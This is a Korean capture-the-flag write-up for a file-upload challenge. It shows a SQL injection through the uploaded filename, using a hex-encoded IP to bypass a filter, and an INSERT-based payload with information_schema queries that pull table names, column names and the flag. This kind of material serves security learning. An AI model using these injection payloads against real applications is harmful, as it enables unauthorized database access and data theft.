# 문제

- 파일 업로드 폼이 있고 파일을 업로드하면 업로드 된 시간, ip, 파일명이 출력된다.

  

  


#  풀이

- 파일명으로 인젝션을 시도해야 한다.
- 필터링 체크
  - 대부분 쿼리가 다 가능하다.
  - ip 입력이 막혀있으므로 이것만 hex로 우회 해주자.
- 구성
  - select 결과값을 insert 시킬수있다.

- 테이블 이름 알아내기

  - time값은 스탬프 형식으로 저장되기 때문에 time 값으로 쿼리결과를 받아오는것은 안됨.

  - insert values쌍을 하나 더 추가시켜서 file_name에 쿼리결과값을 받아야함

    - 예시 - 컬럼명 얻어오기

      `filename="123', '111111', 0x3231392e3234382e3136372e313337),((select column_name from information_schema.columns where table_name='테이블명' limit 0,1), '111111', 0x3231392e3234382e3136372e313337)#"`

- 이런식으로 테이블명, 속성명(이번 문제에선 속성이 1개라 몰라도 되지만) 얻어와서 마지막에 select로 플래그값 출력시키면 됨.



# 알게된 것

### insert시 유의사항

- insert 구문 안에 select 같은 쿼리를 넣어도 된다.
  - 단 현재 insert 되는 테이블과 다른 테이블을 지정해야 한다.(아마?)
    - `insert into myTable values((select flag from chall30.chall30_answer limit 1), 129);`

### information_schema injection

- 테이블이름 알아내기
  - `select table_name from information_schema.tables where table_schema = database() limit 1, 1`
    - 현재 DB(`database()`)에 해당하는 테이블이름 가져오기
- 속성명 알아내기
  - `select column_name from information_schema.columns where table_name='구한 테이블명' limit 0,1`